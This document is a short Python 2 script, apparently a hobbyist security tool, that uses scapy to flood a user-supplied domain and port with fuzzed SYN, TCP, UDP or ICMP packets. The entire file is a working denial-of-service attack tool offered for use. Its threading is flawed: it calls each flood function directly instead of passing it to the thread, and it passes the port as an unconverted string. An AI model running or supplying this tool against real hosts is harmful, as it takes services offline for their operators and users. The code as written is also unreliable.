#!/usr/bin/env python

__author__ = "bt3gl"

import threading
import socket
from scapy.all import *


def synFlood(target, port):
    ip = fuzz(IP(dst=target))
    syn = fuzz(TCP(dport=port, flags='S'))
    send(ip/syn, verbose=0)


def tcpFlood(target, port):
    ip = fuzz(IP(dst=target))
    tcp = fuzz(TCP(dport=port))
    send(ip/tcp, verbose=0)


def udpFlood(target, port):
    ip = fuzz(IP(dst=target))
    udp = fuzz(UDP(dport=port))
    send(ip/udp, verbose=0)


def icmpFlood(target):
    ip = fuzz(IP(dst=target))
    icmp = fuzz(ICMP())
    send(ip/icmp, verbose=0)


def option(count, op, ip, port):
    if op == '1':
        for i in range(count):
            threading.Thread(target=synFlood(ip, port)).start()

    elif op == '2':
        for i in range(count):
            threading.Thread(target=tcpFlood(ip, port)).start()

    elif op == '3':
        for i in range(count):
            threading.Thread(target=udpFlood(ip, port)).start()

    elif op == '4':
        for i in range(count):
            threading.Thread(target=icmpFlood(ip)).start()

    else:
        print "Option not valid."
        sys.exit()


def getIP(domainName):
    return socket.gethostbyname(domainName)


if __name__ == '__main__':
    domainName = raw_input('Type the domain name: ')
    port = raw_input('Type the port: ')
    op = raw_input("Select the flood attack type: 1) syn, 2) tcp, 3)udp, 4) icmp ")
    count = raw_input("Select the count: ")
    ip = getIP(domainName)
    option(int(count), op, ip, port)
